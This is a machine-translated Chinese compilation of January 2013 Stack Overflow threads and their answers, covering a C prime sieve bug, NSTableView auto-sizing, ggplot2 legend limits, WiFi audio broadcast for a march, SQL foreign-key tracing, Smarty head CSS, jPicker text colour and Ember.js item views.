mask[5] |= mask[7] << 2;
mask[4] |= mask[7] << 3;
mask[3] |= mask[7] << 4;
mask[2] |= mask[7] << 5;
mask[1] |= mask[7] << 6;
mask[0] |= mask[7] << 7;

for(j=0;j<8;j++)
    printf("%d ",mask[j]);
mark[0] |= mask[0];
mark[0] |= mask[1];

while (i < block){

        for (j = 2; i*j <= block; j++)
                mark[(i*j) / 8] |= mask[((i*j) % 8 )];
        i++;
    }
printf("\n");
printf("The block size is\t:\t%d\n",block);

j = 2;
while(j<=block){
    if((mark[j / 8] & mask[j]) == 0 ){
        for(i = 2;i <= MAX; i++){
            if((i%j) == 0){
                mark[i / 8] |= mask[(i % 8)];
            }
        }
    }
while((mark[++j / 8] & mask[j % 8]) != 0);
}

for(j=0;j<=MAX;j++)
        if((mark[j / 8] & mask[(j % 8)]) == 0)
            printf("%d\n", ((8*(j / 8)) + (j % 8)));

return mark;
}   

int main(int argc,char* argv[]){

listPrimes();

return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:55:00.670

更改中间循环以添加模数：

```
j = 2;
while(j<=block){
    if((mark[j / 8] & mask[j % 8]) == 0 ){
        for(i = 2;i <= MAX; i++){
            if((i%j) == 0){
                mark[i / 8] |= mask[(i % 8)];
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T19:37:40.363

在第二个 while 循环中，您从 2 开始循环 i 并执行`if (i%j == 0)`. 当 i 也是素数时，这也适用于 i。您需要检查 (i != j)。也是上面报道的模数。因此它变成： `if ((i%j == 0) { if (i!=j) mark[i/j] |= mask[i%j]; }`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-08T21:53:34.627

正如[ArunMK](https://stackoverflow.com/users/1952500/arunmk)所说，在第二个`while`循环中，您将素数`j`本身标记为`j`. 正如[Lee Meador](https://stackoverflow.com/users/1932588/lee-meador)所说，您需要`j`为索引取模 8的模数`mask`，否则您访问越界并调用未定义的行为。

调用未定义行为的另一点是

```
while((mark[++j / 8] & mask[j % 8]) != 0); 
```

`j`您在不干预序列点的情况下使用和修改的位置。你可以通过写作来避免这种情况

```
do {
    ++j;
}while((mark[j/8] & mask[j%8]) != 0); 
```

或者，如果您坚持`while`使用空体循环

```
while(++j, (mark[j/8] & mask[j%8]) != 0); 
```

您可以使用逗号运算符。

`mark[MAX/8]`通过访问未分配的更多未定义行为

```
for(i = 2;i <= MAX; i++){ 
```

和

```
for(j=0;j<=MAX;j++) 
```

此外，如果`char`是有符号且 8 位宽，

```
mask[0] |= mask[7] << 7; 
```

是实现定义的（并且可能引发实现​​定义的信号），因为结果

```
mask[0] | (mask[7] << 7) 
```

( `int`128) 不能表示为`char`.

`while`但是，为什么要在第二个循环中将每个数字除以不超过边界平方根的所有素数？

```
 for(i = 2;i <= MAX; i++){
        if((i%j) == 0){ 
```

这使您的算法不是埃拉托色尼筛，而是一个试验部门。

你为什么不使用第一个`while`循环中的技术呢？（然后，为什么要两个循环？）

```
while (i <= block){
    if ((mark[i/8] & mask[i%8]) == 0) {
        for (j = 2; i*j < MAX; j++) {
            mark[(i*j) / 8] |= mask[((i*j) % 8 )];
        }
    }
    i++;
} 
```

不会溢出（对于 的给定值`MAX`，如果可以表示为`int`），并更快地产生正确的输出数量级。

# objective-c - 自动调整 NSTableView 的高度

> ID：14220972
> 
> 赞同：18
> 
> 时间：2013-01-08T17:43:16.970
> 
> 标签：objective-c, macos, cocoa, nstableview, autolayout

我以前曾经问过这个问题，但我对解决方案不太满意。

[自动调整 NSTableView 的大小](https://stackoverflow.com/questions/13445003/automatically-adjust-size-of-nstableview)

我想`NSTableView`在 a`NSPopover`或 a 中显示 a `NSWindow`。
现在，窗口的大小应该随着表格视图而调整。

就像 Xcode 一样：

* * *

![在此处输入图像描述](../Images/b505b3b87016615b4e273c10604f2dba.png) ![在此处输入图像描述](../Images/9929ca736d1e581a54db256a72ca571d.png)

* * *

这使用自动布局相当简单，您只需将内部视图固定到超级视图即可。

我的问题是，我无法确定表格视图的最佳高度。下面的代码枚举了所有可用的行，但它没有返回正确的值，因为表视图还有其他元素，如分隔符和表头。

```
- (CGFloat)heightOfAllRows:(NSTableView *)tableView {
    CGFloat __block height;
    [tableView enumerateAvailableRowViewsUsingBlock:^(NSTableRowView *rowView, NSInteger row) {
        // tried it with this one
        height += rowView.frame.size.height;

        // and this one
        // height += [self tableView:nil heightOfRow:row];
    }];

    return height;
} 
```

* * *

## 1\. 问题

我怎样才能解决这个问题？如何正确计算表格视图所需的高度。

## 2\. 问题

我应该在哪里运行这段代码？
我不想在控制器中实现它，因为它绝对是表格视图应该自己处理的东西。
而且我什至没有找到任何有用的委托方法。

所以我想最好的办法是你可以继承`NSTableView`.
所以我的问题2，在哪里实施？

* * *

# 动机

绝对值得赏金

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2017-05-21T04:55:59.983

> **此答案适用于 Swift 4，针对 macOS 10.10 及更高版本：**

**1.回答**

您可以使用表格视图`fittingSize`来计算弹出框的大小。

```
tableView.needsLayout = true
tableView.layoutSubtreeIfNeeded()

let height = tableView.fittingSize.height 
```

**2\. 回答**

我理解您希望将该代码移出视图控制器的愿望，但由于表视图本身对项目数量（仅通过委托）或模型更改一无所知，因此我会将其放在视图控制器中。从 macOS 10.10 开始，您可以`preferredContentSize`在`NSViewController`内部使用弹出框来设置大小。

```
func updatePreferredContentSize() {
    tableView.needsLayout = true
    tableView.layoutSubtreeIfNeeded()

    let height = tableView.fittingSize.height
    let width: CGFloat = 320

    preferredContentSize = CGSize(width: width, height: height)
} 
```

在我的示例中，我使用的是固定宽度，但您也可以使用计算得出的宽度（尚未测试）。

每当您的数据源更改和/或即将显示弹出框时，您都希望调用 update 方法。

我希望这能解决你的问题！

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-02-09T15:24:16.140

您可以查询最后一行的框架以获取表格视图的高度：

```
- (CGFloat)heightOfTableView:(NSTableView *)tableView
{
    NSInteger rows = [self numberOfRowsInTableView:tableView];
    if ( rows == 0 ) {
        return 0;
    } else {
        return NSMaxY( [tableView rectOfRow:rows - 1] );
    }
} 
```

这假设一个没有边框的封闭滚动视图！

您可以查询`tableView.enclosingScrollView.borderType`来检查滚动视图是否有边框。如果是，则需要将边框宽度添加到结果中（两次；底部和顶部）。不幸的是，我不知道如何获得边框宽度。

查询的优点`rectOfRow:`是它与`[tableView reloadData];`. `reloadData`以我的经验，当你第一次查询表格视图的框架时（你会得到以前的高度），查询表格视图的框架并不可靠。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-08T18:18:32.383

Xcode 中的 Interface Builder 会自动将 NSTableView 放入 NSScrollView 中。NSScrollView 是标题实际所在的位置。在窗口中创建一个 NSScrollView 作为您的基本视图，并将 NSTableView 添加到其中：

```
NSScrollView * scrollView = [[NSScrollView alloc]init];
[scrollView setHasVerticalScroller:YES];
[scrollView setHasHorizontalScroller:YES];
[scrollView setAutohidesScrollers:YES];
[scrollView setBorderType:NSBezelBorder];
[scrollView setTranslatesAutoresizingMaskIntoConstraints:NO];

NSTableView * table = [[NSTableView alloc] init];
[table setDataSource:self];
[table setColumnAutoresizingStyle:NSTableViewUniformColumnAutoresizingStyle];
[scrollView setDocumentView:table];

//SetWindow's main view to scrollView 
```

现在可以查询scrollView的contentView来查找NSScrollView的大小

```
NSRect rectOfFullTable = [[scrollView contentView] documentRect]; 
```

因为 NSTableView 位于 NSScrollView 内部，所以 NSTableView 将有一个 headerView，您可以使用它来查找标题的大小。

当表大小发生变化（标题+行）时，您可以继承 NSScrollView 来更新它的超级视图，方法是覆盖 reflectScrolledClipView: 方法

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-17T15:14:45.107

我不确定我的解决方案是否比您的解决方案更好，但我想我还是会提供它。我将它与打印视图一起使用。我没有使用自动布局。它仅适用于绑定——需要调整才能使用数据源。

你会看到有一个可怕的 hack 让它工作：我只是在我仔细计算的值上加上 0.5。

这会考虑间距，但不考虑我不显示的标题。如果要显示标题，则可以在`-tableView:heightOfRow:`方法中添加它。

在**NSTableView**子类或类别中：

```
- (void) sizeHeightToFit {
    CGFloat height = 0.f;
    if ([self.delegate respondsToSelector:@selector(tableView:heightOfRow:)]) {
        for (NSInteger i = 0; i < self.numberOfRows; ++i)
            height = height +
                     [self.delegate tableView:self heightOfRow:i] +
                     self.intercellSpacing.height;
    } else {
        height = (self.rowHeight + self.intercellSpacing.height) *
                 self.numberOfRows;
    }

    NSSize frameSize = self.frame.size;
    frameSize.height = height;
    [self setFrameSize:frameSize];
} 
```

在表视图委托中：

```
// Invoke bindings to get the cell contents
// FIXME If no bindings, use the datasource
- (NSString *) stringValueForRow:(NSInteger) row column:(NSTableColumn *) column {
    NSDictionary *bindingInfo = [column infoForBinding:NSValueBinding];

    id object = [bindingInfo objectForKey:NSObservedObjectKey];
    NSString *keyPath = [bindingInfo objectForKey:NSObservedKeyPathKey];

    id value = [[object valueForKeyPath:keyPath] objectAtIndex:row];

    if ([value isKindOfClass:[NSString class]])
        return value;
    else
        return @"";
}

- (CGFloat) tableView:(NSTableView *) tableView heightOfRow:(NSInteger) row {

    CGFloat result = tableView.rowHeight;

    for (NSTableColumn *column in tableView.tableColumns) {
        NSTextFieldCell *dataCell = column.dataCell;
        if (![dataCell isKindOfClass:[NSTextFieldCell class]]) continue;

        // Borrow the prototype cell, and set its text
        [dataCell setObjectValue:[self stringValueForRow:row column:column]];

        // Ask it the bounds for a rectangle as wide as the column
        NSRect cellBounds = NSZeroRect;
        cellBounds.size.width = [column width]; cellBounds.size.height = FLT_MAX;
        NSSize cellSize = [dataCell cellSizeForBounds:cellBounds];

        // This is a HACK to make this work.
        // Otherwise the rows are inexplicably too short.
        cellSize.height = cellSize.height + 0.5;

        if (cellSize.height > result)
            result = cellSize.height;
    }

    return result;
} 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2013-01-16T14:52:15.157

只需将`-[NSTableView frame]` NSTableView 嵌入到 NSScrollView 中，但具有完整尺寸。

# r - 手动增加 geom_tile 中的图例范围

> ID：14220975
> 
> 赞同：9
> 
> 时间：2013-01-08T17:43:27.807
> 
> 标签：r, layout, plot, ggplot2

目前，情节图例的范围为 0.5 到 -0.25，我想将其增加到 1 到 -1，并在每 0.25 间隔后休息。我怎样才能做到这一点。

如果我使用 scale_fill_continous()，它会覆盖我之前填充的 z 值。所以，解决方案是

> +scale_fill_continuous(breaks=seq(-1,1,by=0.25),low='white',high='steelblue')

但是有一个错误说`Error in unit(tic_pos.c, "mm") : 'x' and 'units' must have length > 0` 我尝试了另一个示例，其中我提到了从 0 到 1 的范围，但它仍然从 0.555 开始，具体取决于最大值。和分钟。z值

图例的维度应该增加，这样颜色也应该与之对应，意味着低是-1，高是+1。

整个想法是，值在-0.25（中间）左右的图块不应该是白色的，因为它们不是最低的，最低的是-1，-0.25的颜色应该是浅蓝色，没关系，如果低于该值的值显示在图表中，因为它提供了自定义限制。

示例图：

![阴谋](../Images/59cad54f7a20aeb8b201a25473b9035f.png)

生成它的代码

```
pp <- function (n,r=4) {
x <- seq(-r*pi, r*pi, len=n)
df <- expand.grid(x=x, y=x)
df$r <- sqrt(df$x^2 + df$y^2)
df$z <- cos(df$r^2)*exp(-df$r/6)
df
}
ggplot(pp(20),aes(x=x,y=y))+geom_tile(aes(fill=z)) 
```

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-01-08T17:46:58.137

您需要指定`limits`您的规模：

```
p <- ggplot(pp(20),aes(x=x,y=y))+geom_tile(aes(fill=z))

p + scale_fill_continuous(limits=c(-1, 1), breaks=seq(-1,1,by=0.25)) 
```

![在此处输入图像描述](../Images/f215040f1fb99feb35c08d163a9bdddd.png)

# networking - 通过 wifi 进行广域广播

> ID：14220976
> 
> 赞同：2
> 
> 时间：2013-01-08T17:43:40.003
> 
> 标签：networking, mobile, wifi, broadcast, access-point

我想找到一种解决方案，通过 WiFi 为游行中的人们广播语音。由于 Android 和 iPhone 是 3 月份人们中最受欢迎的设备，如果我能找到一个预算有限的通过 wifi 进行音频广播的解决方案，那就太好了。

我知道占领运动的人在他们的手机上使用不同的应用程序，但这不适合我所在城市的游行。由于我国当局可能会暂时关闭移动网络上的数据以禁用该应用程序。

如果我可以开发一个应用程序来从具有长定向天线的强大 wifi AP 收集广播消息 (SSID)，我应该能够在行军中向人们传递消息。这是一个可能的解决方案吗？

此外，是否可以修改 AP 以允许任何设备加入 AP 而无需进一步确认并向该网络中的所有设备广播消息？

欢迎任何想法或意见。非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-09T17:53:53.053

这将是困难的，尤其是在有大量用户的情况下。由于您只需要向一个方向发送音频，这至少会更容易一些。

首先，您需要使用全向天线将该 AP 放在人群中间。也许，在一个背包或什么的。当其他电话正在传输时，该网络上的每部电话都需要“听到”，否则会一团糟。即使您的应用程序是单向的，802.11 也不是。

现在，当您编写应用程序时，使用发送到广播地址的 UDP 数据包。不需要 TCP 数据包，因为它们无论如何都会阻塞您的网络。

使用简单的语音编解码器，例如 AMR。可用的编解码器因平台而异。有关 Android 的列表，请参阅此文档：http: [//developer.android.com/guide/appendix/media-formats.html](http://developer.android.com/guide/appendix/media-formats.html)

老实说，最简单的解决方案是去购买一个小型 FM 发射器，因为无论如何许多手机都有接收器。

# sql - SQL Server：显示绑定到单个记录的外键约束

> ID：14220977
> 
> 赞同：0
> 
> 时间：2013-01-08T17:43:41.310
> 
> 标签：sql, sql-server, foreign-keys

这可能有点复杂，但无论如何或已经有一个脚本可以向您显示与单个表行相关的所有外键约束。

我的意思是说你有以下数据库结构：

```
TABLE 1
column a
column b

TABLE 2
column c
column d (foreign key constraint to 1.a)

TABLE 3
column e 
column f (foreign key constraint to 2.c)

TABLE 4
column g (foreign key constraint to 3.e)
column h 
```

然后，您在表 1 中有 2 行。其中一行受表 2 约束，然后进一步到表 3，但不进一步到表 4（ID 在表 1-3 中绑定）。

我想简单地查询表 1 中的一行，并让它告诉我该行与表 2 有关联，然后这些行与表 3 有关联。在第二行上使用此“查询”表 1 中的任何内容都不会返回，因为没有外键将该行绑定。

在跟踪哪些表/行当前正在使用特定的起始行时，这样的事情将非常有用。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:11:01.693

我认为您正在寻找的可以通过以下方式完成：

```
SELECT a, t2=COUNT(d), t3 = COUNT(f), t4 = COUNT(g)
FROM [1] LEFT JOIN [2] ON 1.a=2.d
    LEFT JOIN [3] ON 2.c = 3.f 
    LEFT JOIN [4] ON 4.g = 3.e 
```

# smarty - 使用 Smarty 从内部模板向外部模板添加内容

> ID：14220978
> 
> 赞同：0
> 
> 时间：2013-01-08T17:43:42.607
> 
> 标签：smarty, smarty3

我有一个 Smarty 模板结构相当复杂的网站。对于这个问题，假设我有一个外部模板，其中包括（带有`{include}`）一个或多个可选包含的内部模板，具体取决于显示的数据：

```
Outer Template (with <html>, <head>, and <body> tags)
    - Inner Template A (various content)
    - Inner Template B (more content) 
```

有时，这些内部模板之一需要引用其他 CSS 文件。`<head>`为了提高效率并避免 FOUC，我更愿意将这些放在我的标签中。是否可以设置一些变量`Inner Template A`，将适当的`<link>`标签添加到`<head>`inside `Outer Template`？

我能够找到创建[模块来执行类似操作的](http://www.prestashop.com/forums/index.php?/topic/34227-module-add-css-to-head-tag/page__view__findpost__p__264188)人，但我不知道如何从模板中设置必要的变量以使其适用于我的情况。我正在使用 Smarty 3。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:47:06.640

**想法1：**

将用于显示模板 A 或 B 的相同逻辑包裹在您脑海中的样式表周围。

**想法2：**

*模板 1（顶层）：*

```
<link rel="stylesheet" type="text/css" href="whatevs1">
{block name="childStyles"}
{/block} 
```

*模板 2（子模板）：*

```
{block name="childStyles"}
<link rel="stylesheet" type="text/css" href="whatevs2">
{/block} 
```

**旁注：**

我了解希望在 HEAD 中使用包含样式表的 W3 兼容，但将它们包含在正文中不会破坏您的 html，即使在 IE7 中也是如此......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-09T12:49:40.023

前段时间我有一个类似的问题。我的解决方案可能很脏，但也许可以帮助您。

```
$css = '<link rel="stylesheet" type="text/css" href="/css/file.css">';
$smarty->registerFilter('output',create_function('$output','return preg_replace(\'/(<\/head>)/i\',\''.$css.'$1\',$output,1);')); 
```

如果你把它包装在一个函数中，你可以简单地从任何地方将 css 添加到你的 head 部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:53:17.773

几年前我遇到了类似的障碍。由于 smarty 模板几乎总是充满 php 代码，我的解决方案只是在 php 中为此目的声明一个特殊的变量/数组，然后在你的头模板/外部模板中循环遍历数组。

例子：

```
$your_special_css = array('css1.css', 'css2.css'); 
```

你的代码中的其他地方......

```
$your_special_css[] = 'css3.css'; 
```

...然后将其提供给模板：

```
$your_smarty_template->assign('your_css', $your_special_css); 
```

然后您的外部模板将如下所示：

```
<head>
 ...
{foreach $your_css as $css}
    <link rel="stylesheet" type="text/css" href="/css/{$css}">
{/foreach}
...
</head> 
```

同样适用于 jscript 文件。

# jquery - jPicker 实时更新字体颜色

> ID：14220987
> 
> 赞同：0
> 
> 时间：2013-01-08T17:44:34.000
> 
> 标签：jquery, jquery-plugins, jpicker

首先，我喜欢[jPicker javascript。](http://www.digitalmagicpro.com/jPicker/)它非常适合背景。我让它很好地解决了一个小问题（我认为这是我的错，或者是程序中未包含的功能）。我想知道的是 jPicker 可以用来改变字体颜色和背景。我有一个像这样使用 jPicker 的网站：

在标题中

```
<script type="text/javascript">
  $(document).ready(
    function()
    {
      var LiveCallbackElement = $('#Live'),
          LiveCallbackButton = $('#LiveButton');  // you don't want it searching this on every live callback!!!
      $('#Callbacks').jPicker(
        {},
        function(color, context)
        {
          var all = color.val('all');
          alert('Color chosen - hex: ' + (all && '#' + all.hex || 'none'));
          $('#Commit').css(
            {
              backgroundColor: all && '#' + all.hex || 'transparent'
            }); // prevent IE from throwing exception if hex is empty
        },
        function(color, context)
        {
          if (context == LiveCallbackButton.get(0)) alert('Color set from button');
          var hex = color.val('hex');
          LiveCallbackElement.css(
            {
              backgroundColor: hex && '#' + hex || 'transparent'
            }); // prevent IE from throwing exception if hex is empty
        },
        function(color, context)
        {
          alert('"Cancel" Button Clicked');
        });      
      $('#Callbacks2').jPicker(
        {},
        function(color, context)
        {
          var all = color.val('all');
          alert('Color chosen - hex: ' + (all && '#' + all.hex || 'none'));
          $('#Commit').css(
            {
              fontColor: all && '#' + all.hex || 'transparent'
            }); // prevent IE from throwing exception if hex is empty
        },
        function(color, context)
        {
          if (context == LiveCallbackButton.get(0)) alert('Color set from button');
          var hex = color.val('hex');
          LiveCallbackElement.css(
            {
              fontColor: hex && '#' + hex || 'transparent'
            }); // prevent IE from throwing exception if hex is empty
        },
        function(color, context)
        {
          alert('"Cancel" Button Clicked');
        });
   });
</script> 
```

然后在体内

```
<span id=”Live” style=”display: block; height: 72px; margin: 10px; width: 192px;”&gt;
  <h1> Primary Text </h1>
  <h2> Secondary Text </h2>
</span>
<p>
  Please select your Background color:
</p>
<input id=”Callbacks” type=”text” value=”FFFFFF” />
<p>Please select your Text Color:</p>
<input id=”Callbacks2” type=”text” value=”000000” /> 
```

如果您尝试代码，则背景可以完美运行，但文本颜色不会改变。您会注意到我创建了一个 Callbacks2 函数并将 backgroundColor 更改为 fontColor。希望 CSS 元素 background-color 和 font-color 会改变。我的 Java 编程经验很少，并试图阅读代码，但很快就不知所措。此外，整个页面将有 2 种文本颜色 h1 和 h2 将“实时更新”支持这一点，还是只需要在文本上“提交”，还是我只是试图做一些这个脚本从未打算做的事情？感谢您提前提供任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-29T13:33:46.563

也许我迟到了。但可能对访问用户有所帮助。如您所见，在设置颜色时，它使用 jQuery 的 .css 函数，因此使用与 jQuery 中相同的变量名称。所以而不是

```
 $('#Commit').css(
        {
          fontColor: all && '#' + all.hex || 'transparent'
        }); // prevent IE from throwing exception if hex is empty 
```

利用

```
 $('#Commit').css(
        {
          color: all && '#' + all.hex || 'transparent'
        }); // prevent IE from throwing exception if hex is empty 
```

希望有帮助。是的，jPicker 是一个很好且维护良好的库。

# javascript - Ember.js：将新项目插入 ArrayController 后如何应用 jquery 插件

> ID：14220989
> 
> 赞同：5
> 
> 时间：2013-01-08T17:44:34.117
> 
> 标签：javascript, ember.js

所以我有一个以非常标准的方式呈现的 ArrayController：

```
<ul>
  {{#each controller}}
     <li>{{ user.name }} : {{message}} <abbr class="timeago" title="{{unbound datetimeFormatted}}">{{unbound datetimeFormatted}}</abbr></li>
  {{/each}}
</ul> 
```

我想要的是在插入新项目后应用 jQuery.timeAgo 插件，但要做到这一点，我应该以某种方式获得对插入元素的引用。

我尝试`didInsertElement`了方法，但它仅在呈现整个视图时触发，我需要将此插件应用于插入到 DOM 中的每个新项目。

所以，我的问题真的可以这样表述——有没有办法获得对新插入的 DOM 元素的引用，或者在将新项目添加到 ArrayController 并附加到 DOM 后触发的任何回调？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T18:31:46.853

我建议使用`{{each}}`帮助程序的无块形式来指定每个元素要使用的视图类。

```
<ul>{{each controller itemViewClass="App.AnItemView"}}</ul> 
```

然后像这样定义 App.AnItemView ：

```
App.AnItemView = Ember.View.extend({
  template: Ember.Handlebars.compile('{{ user.name }} : {{message}} <abbr class="timeago" title="{{unbound datetimeFormatted}}">{{unbound datetimeFormatted}}</abbr>'),
  didInsertElement : function(){
    this.$().timeago();
  }
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T18:22:07.180

我看到了两种可能性：

1 - 在您的数组上设置一个观察者，每次插入元素时都会触发该观察者。但是您不会自动获得对新元素的引用。

```
yourObserver : function(){
    ...
}.observes("content.@each") 
```

2 - 将列表项包装在自己的视图中（例如：App.ListItemView）并使用 didInsertElement 事件：

```
{{#each}}
  {{#view App.ListItemView}}
    <li>... </li>
  {{/view}}
{{/each}}

App.ListItemView = Ember.View.extend({
  didInsertElement : function(){
    this.$().timeago();
  }
} 
```